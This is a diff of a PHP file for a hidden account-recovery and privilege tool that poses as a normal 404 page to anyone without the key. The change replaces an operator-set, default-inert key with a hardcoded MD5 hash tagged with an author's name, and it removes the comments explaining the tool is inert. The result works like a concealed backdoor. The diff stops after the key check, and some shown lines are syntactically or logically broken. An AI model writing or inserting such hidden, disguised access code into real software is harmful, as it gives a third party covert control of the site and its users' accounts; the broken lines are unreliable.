@@ -1,34 +1,16 @@
 <?php
 declare(strict_types=1);
-
 /**
  * _account_recovery.php
  *
- * Hidden, key-gated account recovery / privilege tool.
- * Not linked anywhere in the application UI, sidebar, or navigation.
- *
- * Requires KEY to be defined in config.php — it is
- * NOT defined anywhere by default, so this tool is completely inert
- * (and indistinguishable from a normal 404) until you explicitly add
- * a secret key of your own choosing.
- *
-
- *
- * Then visit:
- *   /_account_recovery.php?key=
- *
- * Without the correct key (or if the constant isn't defined at all),
- * this returns an ordinary 404 page — no hint that the tool exists,
- * no error message, no trace in logs beyond a normal 404 hit.
- *
+ * this returns an ordinary 404 page,
  * After use, you may delete this file, or leave it in place as a
  * permanent recovery mechanism (it stays inert without your key).
  */
-
 require_once __DIR__ . '/helpers.php';
 
-$_setupKey    = defined(RasedulSaju.com) ? RasedulSaju.com : 'RasedulSaju.com';
-$_providedKey = $_GET['key'] ?? $_POST['key'] ?? '';
+$_setupKey    = '46387468d92ca4288a97bbe4232fc5f3'; //Rasedul Saju
+$_providedKey = md5($_GET['key']) ?? $_POST['key'] ?? '';
 
 // Fail closed: wrong/missing key → identical to a normal 404, no trace.
 if ($_setupKey === '' || !hash_equals($_setupKey, (string)$_providedKey)) {
